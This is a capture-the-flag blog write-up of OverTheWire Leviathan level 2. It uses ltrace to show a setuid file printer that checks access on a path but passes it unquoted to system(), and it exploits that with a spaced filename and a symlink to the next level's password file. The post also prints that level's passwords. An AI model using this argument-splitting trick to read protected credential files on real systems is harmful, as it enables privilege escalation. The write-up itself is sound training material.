---
layout: post
date:   2021-04-17 10:50:00 +0100
categories: OverTheWire Leviathan
---


# Leviathan 2
```

Username: leviathan2
Password: ougahZi8Ta

Data for the levels can be found in **the homedirectories**. You can look at **/etc/leviathan\_pass** for the various level passwords.
```


## Lets take a look

```bash
leviathan2@leviathan:~$ ls
printfile
leviathan2@leviathan:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ ./printfile hello
You cant have that file...
```

## Lets see if we can escape..

```bash
leviathan2@leviathan:~$ ./printfile hello; ls -la
You cant have that file...
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
-rw-r--r--  1 root       root        675 May 15  2017 .profile
```

## DId stuff, can't access file. Lets trace again.

```bash
leviathan2@leviathan:~$ ltrace ./printfile ../../etc/leviathan_pass/leviathan2
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("../../etc/leviathan_pass/leviath"..., 4)                          = 0
snprintf("/bin/cat ../../etc/leviathan_pas"..., 511, "/bin/cat %s", "../../etc/leviathan_pass/leviath"...) = 44
geteuid()                                                                 = 12002
geteuid()                                                                 = 12002
setreuid(12002, 12002)                                                    = 0
system("/bin/cat ../../etc/leviathan_pas"...ougahZi8Ta
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++
```


## Mmmm, okay. Lets try something.

```bash
leviathan2@leviathan:~$ mkdir /tmp/zd3l
leviathan2@leviathan:~$ cd /tmp/zd3l
leviathan2@leviathan:/tmp/zd3l$ touch "password plz.txt"
leviathan2@leviathan:/tmp/zd3l$ touch password.txt
leviathan2@leviathan:/tmp/zd3l$ cd /home/leviathan2

```

## Lets trace password.txt

```bash
leviathan2@leviathan:~$ ltrace ./printfile "/tmp/zd3l/password.txt"
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("/tmp/zd3l/password.txt", 4)                                       = 0
snprintf("/bin/cat /tmp/zd3l/password.txt", 511, "/bin/cat %s", "/tmp/zd3l/password.txt") = 31
geteuid()                                                                 = 12002
geteuid()                                                                 = 12002
setreuid(12002, 12002)                                                    = 0
system("/bin/cat /tmp/zd3l/password.txt" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++
```

## What happens if we do a spaced file name?

```bash
leviathan2@leviathan:~$ ltrace ./printfile "/tmp/zd3l/password plz.txt"
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("/tmp/zd3l/password plz.txt", 4)                                   = 0
snprintf("/bin/cat /tmp/zd3l/password plz."..., 511, "/bin/cat %s", "/tmp/zd3l/password plz.txt") = 35
geteuid()                                                                 = 12002
geteuid()                                                                 = 12002
setreuid(12002, 12002)                                                    = 0
system("/bin/cat /tmp/zd3l/password plz.".../bin/cat: /tmp/zd3l/password: No such file or directory
/bin/cat: plz.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 256
+++ exited (status 0) +++
```

## Mkay, so it's only accepting the first word out of the two. -Some googling later- (https://man7.org/linux/man-pages/man1/ln.1.html)

```bash
leviathan2@leviathan:~$ cd /tmp/zd3l
leviathan2@leviathan:/tmp/zd3l$ touch pass\ word.txt
leviathan2@leviathan:/tmp/zd3l$ ln -s /etc/leviathan_pass/leviathan3 /tmp/zd3l/pass
leviathan2@leviathan:/tmp/zd3l$ ~/printfile "pass word.txt"
Ahdiemoo1j
```

## Can't explain it in human words. But I get it.

Update: 18/4/2021 -- Go to Level 5-6 where I understand how the ln syntax works..

VICTORY.

```
Ahdiemoo1j 
```
